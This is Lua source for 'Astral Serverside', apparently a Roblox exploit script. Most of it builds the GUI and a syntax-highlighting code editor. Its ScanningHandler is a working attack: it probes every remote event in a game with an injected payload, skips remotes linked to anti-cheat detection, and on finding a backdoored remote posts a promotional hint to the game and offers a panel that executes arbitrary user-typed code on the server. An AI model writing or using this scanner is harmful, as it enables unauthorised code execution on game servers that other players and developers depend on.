G2L["37"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
G2L["37"]["Size"] = UDim2.new(0, 17, 0, 17);
G2L["37"]["Position"] = UDim2.new(1, -17, 1, -17);
G2L["37"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["37"]["Name"] = [[Ground]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Bar
G2L["38"] = Instance.new("Frame", G2L["f"]);
G2L["38"]["Visible"] = false;
G2L["38"]["ZIndex"] = 2;
G2L["38"]["BorderSizePixel"] = 0;
G2L["38"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
G2L["38"]["Size"] = UDim2.new(0, 17, 1, -17);
G2L["38"]["Position"] = UDim2.new(1, -17, 0, 0);
G2L["38"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["38"]["Name"] = [[Y_Bar]];
G2L["38"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Bar
G2L["39"] = Instance.new("Frame", G2L["f"]);
G2L["39"]["Visible"] = false;
G2L["39"]["ZIndex"] = 2;
G2L["39"]["BorderSizePixel"] = 0;
G2L["39"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
G2L["39"]["Size"] = UDim2.new(1, -17, 0, 17);
G2L["39"]["Position"] = UDim2.new(0, 0, 1, -17);
G2L["39"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["39"]["Name"] = [[X_Bar]];
G2L["39"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Border
G2L["3a"] = Instance.new("UIStroke", G2L["f"]);
G2L["3a"]["Name"] = [[Border]];
G2L["3a"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Border.Rainbow
G2L["3b"] = Instance.new("UIGradient", G2L["3a"]);
G2L["3b"]["Name"] = [[Rainbow]];
G2L["3b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.170, Color3.fromRGB(255, 166, 0)),ColorSequenceKeypoint.new(0.330, Color3.fromRGB(255, 255, 0)),ColorSequenceKeypoint.new(0.500, Color3.fromRGB(0, 255, 0)),ColorSequenceKeypoint.new(0.670, Color3.fromRGB(0, 0, 255)),ColorSequenceKeypoint.new(0.830, Color3.fromRGB(76, 0, 131)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(239, 131, 239))};


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Border.Rainbow.Rotation
G2L["3c"] = Instance.new("LocalScript", G2L["3b"]);
G2L["3c"]["Name"] = [[Rotation]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Corner
G2L["3d"] = Instance.new("UICorner", G2L["f"]);
G2L["3d"]["Name"] = [[Corner]];
G2L["3d"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Title
G2L["3e"] = Instance.new("TextLabel", G2L["d"]);
G2L["3e"]["TextWrapped"] = true;
G2L["3e"]["TextStrokeTransparency"] = 0;
G2L["3e"]["BorderSizePixel"] = 0;
G2L["3e"]["TextSize"] = 14;
G2L["3e"]["TextScaled"] = true;
G2L["3e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e"]["BackgroundTransparency"] = 1;
G2L["3e"]["Size"] = UDim2.new(1, 0, 0, 32);
G2L["3e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3e"]["Text"] = [[Astral Serverside]];
G2L["3e"]["Name"] = [[Title]];
G2L["3e"]["Position"] = UDim2.new(0, 0, 0, 10);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute
G2L["3f"] = Instance.new("TextButton", G2L["d"]);
G2L["3f"]["TextStrokeTransparency"] = 0;
G2L["3f"]["BorderSizePixel"] = 0;
G2L["3f"]["TextSize"] = 24;
G2L["3f"]["AutoButtonColor"] = false;
G2L["3f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3f"]["AnchorPoint"] = Vector2.new(0.5, 0);
G2L["3f"]["BackgroundTransparency"] = 1;
G2L["3f"]["Size"] = UDim2.new(1, -50, 0, 30);
G2L["3f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3f"]["Text"] = [[Execute]];
G2L["3f"]["Name"] = [[Execute]];
G2L["3f"]["Position"] = UDim2.new(0.5, 0, 0, 235);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute.Border
G2L["40"] = Instance.new("UIStroke", G2L["3f"]);
G2L["40"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["40"]["Name"] = [[Border]];
G2L["40"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute.Border.Rainbow
G2L["41"] = Instance.new("UIGradient", G2L["40"]);
G2L["41"]["Name"] = [[Rainbow]];
G2L["41"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.170, Color3.fromRGB(255, 166, 0)),ColorSequenceKeypoint.new(0.330, Color3.fromRGB(255, 255, 0)),ColorSequenceKeypoint.new(0.500, Color3.fromRGB(0, 255, 0)),ColorSequenceKeypoint.new(0.670, Color3.fromRGB(0, 0, 255)),ColorSequenceKeypoint.new(0.830, Color3.fromRGB(76, 0, 131)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(239, 131, 239))};


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute.Border.Rainbow.Rotation
G2L["42"] = Instance.new("LocalScript", G2L["41"]);
G2L["42"]["Name"] = [[Rotation]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute.Corner
G2L["43"] = Instance.new("UICorner", G2L["3f"]);
G2L["43"]["Name"] = [[Corner]];
G2L["43"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Astral Serverside.MainFrame.Border.Rainbow.Rotation
local function C_6()
local script = G2L["6"];
	while true do
		script.Parent.Rotation = script.Parent.Rotation + 4
		wait()
		if script.Parent.Rotation == 360 or script.Parent.Rotation > 360 then
			script.Parent.Rotation = 0
		end
	end
end;
task.spawn(C_6);
-- StarterGui.Astral Serverside.MainFrame.Drag
local function C_7()
local script = G2L["7"];
	local dragging, dragstart, startpos
	script.Parent.InputBegan:Connect(function(input)
		if input.UserInputType.Name == "MouseButton1" or input.UserInputType.Name == "Touch" then
			dragging, dragstart, startpos = true, input.Position, script.Parent.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then dragging = false end
			end)
		end
	end)
	game:GetService("UserInputService").InputChanged:Connect(function(input)
		if dragging and (input.UserInputType.Name == "MouseMovement" or input.UserInputType.Name == "Touch") then
			local delta = input.Position - dragstart
			script.Parent.Position = UDim2.new(startpos.X.Scale, startpos.X.Offset + delta.X, startpos.Y.Scale, startpos.Y.Offset + delta.Y)
		end
	end)
end;
task.spawn(C_7);
-- StarterGui.Astral Serverside.MainFrame.ScanningHandler
local function C_c()
local script = G2L["c"];
	--= Info =--
	local mainframe = script.Parent
	local scanningframe = mainframe:WaitForChild("ScanningFrame",3)
	local executionframe = mainframe:WaitForChild("ExecutionFrame",3)
	
	local blacklistedstrings = {"CheatDetected", "ExploitDetected","MouseLock","MouseLoc"}
	local vulnremote: RemoteEvent | RemoteFunction = nil
	local backdoored: boolean = false
	local credithint: boolean = true -- Just to give me credit for making Astral :3
	
	--= Setup =--
	scanningframe.Visible = true
	scanningframe.Position = UDim2.new(0,0,0,0)
	executionframe.Visible = false
	executionframe.Position = UDim2.new(-1,0,0,0)
	
	--= Functions =--
	local function notify(desc, duration)
		pcall(function()
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Astral Serverside",
				Text = tostring(desc),
				Duration = duration or 3
			})
			local sound = Instance.new("Sound", workspace)
			sound.SoundId = "rbxassetid://17582299860"
			sound.Volume = 1
			sound.PlayOnRemove = true
			sound:Destroy()
		end)
	end
	
	local function fire(rem,code)
		if not rem then return end
		pcall(function()
			if rem:IsA("RemoteEvent") then
				rem:FireServer(code)
			elseif rem:IsA("RemoteFunction") then
				rem:InvokeServer(code)
			end
		end)
	end
	
	local function checkremote(remote: RemoteEvent | RemoteFunction)
		for _, str in ipairs(blacklistedstrings) do
			if string.find(remote.Name:lower(), str:lower()) then
				return true
			end
		end
		if remote:FindFirstChild("__FUNCTION") or remote.Name == "__FUNCTION" then
			return true
		end
		if remote.Parent.Parent then
			if remote.Parent.Parent.Name == "HDAdminClient" and remote.Parent.Name == "Signals" then
				return true
			end
			if remote.Parent.Name == "RobloxReplicatedStorage" 
				or remote.Parent.Name == "DefaultChatSystemChatEvents" then
				return true
			end
		end
		return false
	end
	
	--= Pre-scanning Variables =--
	local testpartname: string = "starlightreborn_"..tostring(math.random(10000,99999))
	local payload = [[Instance.new("FluidForceSensor", game:GetService("SoundService")).Name = "]]..testpartname..[["]]
	
	--= Scanning =--
	local timer: number = 0
	coroutine.wrap(function()
		repeat
			timer += 0.001
			task.wait(0.001)
		until backdoored
	end)()
	
	local function checkpayload(remote: RemoteEvent | RemoteFunction)
		fire(remote,payload)
		for i = 1,320 do
			if game:GetService("SoundService"):FindFirstChild(testpartname) then
				return true
			end
			task.wait(0.001)
		end
		return false
	end
	
	for _, remote: RemoteEvent | RemoteFunction in ipairs(game:GetDescendants()) do
		if remote.Parent == nil then return end
	
		if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
			if checkremote(remote) then
				continue
			else
				print("Testing: "..remote.Name)
				if checkpayload(remote) then
					backdoored = true
					vulnremote = remote
					fire(vulnremote,[[game:GetService("SoundService"):FindFirstChild("]]..testpartname..[["):Destroy()]])
					break
				end
			end
		end
	end
	
	if backdoored and vulnremote then
		if credithint then fire(vulnremote,[[Instance.new("Hint",workspace).Text="This game was backdoored with: Astral SS  |  Join StrawberryCMD .gg/bXQfb3QWa8"]]) end
		notify("Found backdoor: "..vulnremote.Name.."\nTime took: "..tostring(timer))
		print("\nFound backdoor: "..vulnremote.Name.."\nTime took: "..tostring(timer))
		scanningframe:FindFirstChild("Description").Text = "Found backdoor: "..vulnremote.Name.."\nTime took: "..tostring(timer).."\nLoading execution panel..."
		coroutine.wrap(function()
			task.wait(1)
			executionframe.Visible = true
			scanningframe:TweenPosition(UDim2.new(1,0,0,0),"In","Back",1,false)
			executionframe:TweenPosition(UDim2.new(0,0,0,0),"In","Back",1,false)
			wait(1)
			scanningframe.Visible = false
		end)()
	else
		notify("No backdoors found! \n Exiting script safely...")
		scanningframe:FindFirstChild("Description").Text = "No backdoors found! \n Exiting script safely..."
		task.wait(0.5)
		mainframe.Parent:Destroy()
		return
	end
	
	--= Button Function(s) =--
	executionframe.Execute.MouseButton1Click:Connect(function()
		if not backdoored then return end
		local code = executionframe.FastColoredTextbox.Scroll.TextBox.Text
		fire(vulnremote,code)
	end)
end;
task.spawn(C_c);
-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Handler
local function C_1a()
local script = G2L["1a"];
	--# FastColoredTextBox v3 by: C:\Drive
	
	local fctbelements = {
		scroll = script.Parent.Scroll,
		textbox = script.Parent.Scroll.TextBox,
		cursor = script.Parent.Scroll.Cursor,
		selector = script.Parent.Scroll.LineSelector,
		lines = script.Parent.Scroll.LinesFrame,
		linetemp = script.Parent.Scroll.LinesFrame.TextLabelTemplate,
		highlighting = script.Parent.Scroll.Highlighting,
		measurer = script.Parent.Scroll.TextMeasurer,
		linesvalue = script.Parent.Scroll.LinesValue,
	}
	
	--# Automatic Scrolling (1/7)
	local scrollingframe = fctbelements.scroll
	local textbox = fctbelements.textbox
	local textservice = game:GetService("TextService")
	
	local function updatecanvassize()
		local textsize = textservice:GetTextSize(textbox.Text, textbox.TextSize, textbox.Font, Vector2.new(math.huge, math.huge))
		scrollingframe.CanvasSize = UDim2.new(0, textsize.X + 20, 0, textsize.Y)
	end
	
	--textbox:GetPropertyChangedSignal("Text"):Connect(updatecanvassize) --- MOVED THIS CODE TO LINE 257 OR SOMEWHERE NEAR THAT
	updatecanvassize()
	
	--# Line Checker (2/7)
	local textbox = fctbelements.textbox
	local linesvalue = fctbelements.linesvalue
	
	local function countlines(text)
		return select(2, text:gsub("\n", "\n")) + 1
	end
	
	local lastlinecount = countlines(textbox.Text)
	
	textbox:GetPropertyChangedSignal("Text"):Connect(function()
		local currentlinecount = countlines(textbox.Text)
		if currentlinecount ~= lastlinecount then
			linesvalue.Value += currentlinecount - lastlinecount
			lastlinecount = currentlinecount
		end
	end)
	
	--# Lines (3/7)
	local scrollingframe = fctbelements.scroll
	local frame = fctbelements.lines
	local template = fctbelements.linetemp
	local linesvalue = fctbelements.linesvalue
	
	local clones = {}
	local currentlinecount = 1
	
	linesvalue:GetPropertyChangedSignal("Value"):Connect(function()
		local newlinecount = linesvalue.Value
		if newlinecount > currentlinecount then
			for _ = 1, newlinecount - currentlinecount do
				local clone = template:Clone()
				clone.Visible = true
				clone.Text = tostring(#clones + 2)
				clone.Parent = frame
				table.insert(clones, clone)
			end
		elseif newlinecount < currentlinecount then
			for _ = 1, currentlinecount - newlinecount do
				local lastclone = table.remove(clones)
				if lastclone then lastclone:Destroy() end
			end
		end
		currentlinecount = newlinecount
	end)
	
	--# Cursor (4/7)
	local fasttextbox = fctbelements.scroll
	local textbox = fasttextbox:WaitForChild("TextBox")
	local cursorframe = fasttextbox:WaitForChild("Cursor")
	local measurer = fasttextbox:WaitForChild("TextMeasurer")
	local blinkinterval = 0.5
	local lineheight = textbox.TextSize
	
	cursorframe.Size = UDim2.new(0, 1, 0, lineheight)
	cursorframe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	
	local function updatecursor()
		local cursorpos = textbox.CursorPosition
		if cursorpos <= 0 then
			cursorframe.Visible = false
			return
		end
		local textbeforecursor = textbox.Text:sub(1, cursorpos - 1)
		local linenumber = select(2, textbeforecursor:gsub("\n", "\n")) + 1
		local currentlinetext = textbeforecursor:match(".*()\n") and textbeforecursor:sub(textbeforecursor:match(".*()\n") + 1) or textbeforecursor
	
		measurer.Text = currentlinetext
		cursorframe.Position = UDim2.new(0, measurer.TextBounds.X + 17, 0, (linenumber - 1) * lineheight)
		cursorframe.Visible = true
	end
	
	local function blink()
		while true do
			cursorframe.Visible = not cursorframe.Visible
			wait(blinkinterval)
		end
	end
	
	textbox:GetPropertyChangedSignal("CursorPosition"):Connect(updatecursor)
	textbox:GetPropertyChangedSignal("Text"):Connect(updatecursor)
	spawn(blink)
	updatecursor()
	
	--# Selector (5/7)
	local fasttextbox = fctbelements.scroll
	local textbox = fasttextbox:WaitForChild("TextBox")
	local selector = fasttextbox:WaitForChild("LineSelector")
	local lineheight = textbox.TextSize
	selector.BackgroundTransparency = 0.85
	
	local tweenservice = game:GetService("TweenService")
	local tweeninfo = TweenInfo.new(0, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	
	local function updatelineselector()
		local cursor = textbox.CursorPosition
		if cursor <= 0 then
			selector.Visible = false
			return
		end
		local linenumber = select(2, textbox.Text:sub(1, cursor):gsub("\n", "\n")) + 1
		tweenservice:Create(selector, tweeninfo, {
			Position = UDim2.new(0, 17, 0, (linenumber - 1) * lineheight),
			Size = UDim2.new(1, 0, 0, lineheight),
		}):Play()
		selector.Visible = true
	end
	
	textbox:GetPropertyChangedSignal("CursorPosition"):Connect(updatelineselector)
	textbox:GetPropertyChangedSignal("Text"):Connect(updatelineselector)
	updatelineselector()
	
	--# Syntax Highlighting (6/7)
	local scrollingframe = fctbelements.scroll
	local textbox = scrollingframe:WaitForChild("TextBox")
	local highlightlabel = scrollingframe:WaitForChild("Highlighting")
	
	local keywords = {
		["and"] = "keyword", ["break"] = "keyword", ["do"] = "keyword",
		["else"] = "keyword", ["elseif"] = "keyword", ["end"] = "keyword",
		["false"] = "keyword", ["for"] = "keyword", ["function"] = "keyword",
		["if"] = "keyword", ["in"] = "keyword", ["local"] = "keyword",
		["nil"] = "keyword", ["not"] = "keyword", ["or"] = "keyword",
		["repeat"] = "keyword", ["return"] = "keyword", ["then"] = "keyword",
		["true"] = "keyword", ["until"] = "keyword", ["while"] = "keyword",
		["require"] = "function", ["goto"] = "keyword", ["self"] = "keyword",
		["print"] = "function", ["pairs"] = "function", ["ipairs"] = "function",
		["next"] = "function", ["tonumber"] = "function", ["tostring"] = "function",
		["type"] = "function", ["pcall"] = "function", ["xpcall"] = "function",
		["coroutine"] = "global", ["table"] = "global", ["string"] = "global",
		["math"] = "global", ["os"] = "global",
		["assert"] = "function", ["error"] = "function", ["rawget"] = "function",
		["rawset"] = "function",
		["game"] = "global", ["workspace"] = "global", ["script"] = "global",
		["Instance"] = "type", ["Vector3"] = "type", ["CFrame"] = "type",
		["Color3"] = "type", ["UDim2"] = "type", ["Enum"] = "type",
		["wait"] = "function", ["delay"] = "function", ["spawn"] = "function",
		["tick"] = "function", ["time"] = "function",
		["Vector2"] = "type", ["BrickColor"] = "type", ["Region3"] = "type",
		["Ray"] = "type", ["task"] = "global", ["RunService"] = "global",
		["UserInputService"] = "global",
	}
	
	local colormap = {
		keyword   = Color3.fromRGB(248, 109, 124),
		["function"] = Color3.fromRGB(132, 214, 247),
		["global"]   = Color3.fromRGB(132, 214, 247),
		["type"]     = Color3.fromRGB(132, 214, 247),
		string    = Color3.fromRGB(173, 241, 149),
		comment   = Color3.fromRGB(145, 145, 145),
		number    = Color3.fromRGB(255, 198, 0),
		operator  = Color3.fromRGB(200, 200, 200),
	}
	
	local function rgb(c)
		return math.floor(c.R * 255), math.floor(c.G * 255), math.floor(c.B * 255)
	end
	
	local function colored(text, kind)
		local c = colormap[kind]
		if not c then return text end
		local r,g,b = rgb(c)
		return `<font color="rgb({r},{g},{b})">{text}</font>`
	end
	
	local function highlight(code)
		local result = ""
		local i = 1
		while i <= #code do
			if code:sub(i, i+1) == "--" then
				local comment = code:sub(i):match("^%-%-[^\n]*")
				result ..= colored(comment, "comment")
				i += #comment
			elseif code:sub(i, i) == '"' or code:sub(i, i) == "'" then
				local quote = code:sub(i, i)
				local s, e = code:find(quote..".-"..quote, i)
				local str = s and code:sub(s, e) or quote
				result ..= colored(str, "string")
				i = s and e + 1 or i + 1
			elseif code:sub(i):match("^%d") then
				local num = code:sub(i):match("^%d+%.?%d*")
				result ..= colored(num, "number")
				i += #num
			elseif code:sub(i):match("^%a") then
				local word = code:sub(i):match("^[%a_][%w_]*")
				local kind = keywords[word]
				if kind then
					result ..= colored(word, kind)
				else
					result ..= word
				end
				i += #word
			elseif code:sub(i):match("^[%p]") then
				result ..= colored(code:sub(i,i), "operator")
				i += 1
			else
				result ..= code:sub(i, i)
				i += 1
			end
		end
		return result
	end
	
	local function sync()
		highlightlabel.Text = highlight(textbox.Text)
		highlightlabel.Size = textbox.Size
		highlightlabel.Position = textbox.Position
	end
	
	textbox:GetPropertyChangedSignal("Text"):Connect(sync)
	textbox:GetPropertyChangedSignal("CursorPosition"):Connect(sync)
	textbox:GetPropertyChangedSignal("Size"):Connect(sync)
	sync()
	
	--# Scrollbar Buttons (7/7)
	local ground = script.Parent.Ground
	
	local buttons = {
		y = {
			top = script.Parent.Y_Top,
			btm = script.Parent.Y_Btm,
		},
		x = {
			lft = script.Parent.X_Lft,
			rght = script.Parent.X_Rght,
		}
	}
	
	local bars = {
		y = script.Parent.Y_Bar,
		x = script.Parent.X_Bar,
	}
	
	buttons.y.top.Visible = false
	buttons.y.btm.Visible = false
	buttons.x.rght.Visible = false
	buttons.x.lft.Visible = false
	ground.Visible = false
	
	fctbelements.textbox:GetPropertyChangedSignal("Text"):Connect(function()
		updatecanvassize()
		if fctbelements.scroll.CanvasSize.Y.Offset > (fctbelements.scroll.AbsoluteSize.Y - 16) then
			buttons.y.top.Visible = true
			buttons.y.btm.Visible = true
			--bars.y.Visible = true
		else
			buttons.y.top.Visible = false
			buttons.y.btm.Visible = false
			--bars.y.Visible = false
		end
		
		if fctbelements.scroll.CanvasSize.X.Offset > fctbelements.scroll.AbsoluteSize.X then
			buttons.x.lft.Visible = true
			buttons.x.rght.Visible = true
			--bars.x.Visible = true
		else
			buttons.x.lft.Visible = false
			buttons.x.rght.Visible = false
			--bars.x.Visible = false
		end
		
		if fctbelements.scroll.CanvasSize.Y.Offset > (fctbelements.scroll.AbsoluteSize.Y - 16) and fctbelements.scroll.CanvasSize.X.Offset > fctbelements.scroll.AbsoluteSize.X then
			buttons.y.btm.Position = UDim2.new(1, -17, 1, -34)
			buttons.x.rght.Position = UDim2.new(1, -34, 1, -17)
			ground.Visible = true
		else
			buttons.y.btm.Position = UDim2.new(1, -17, 1, -17)
			buttons.x.rght.Position = UDim2.new(1, -18, 1, -17)
			ground.Visible = false
		end
	end)
end;
task.spawn(C_1a);
-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Border.Rainbow.Rotation
local function C_3c()
local script = G2L["3c"];
	while true do
		script.Parent.Rotation = script.Parent.Rotation + 4
		wait()
		if script.Parent.Rotation == 360 or script.Parent.Rotation > 360 then
			script.Parent.Rotation = 0
		end
	end
end;
task.spawn(C_3c);
-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute.Border.Rainbow.Rotation
local function C_42()
local script = G2L["42"];
	while true do
		script.Parent.Rotation = script.Parent.Rotation + 4
		wait()
		if script.Parent.Rotation == 360 or script.Parent.Rotation > 360 then
			script.Parent.Rotation = 0
		end
	end
end;
task.spawn(C_42);

return G2L["1"], require;
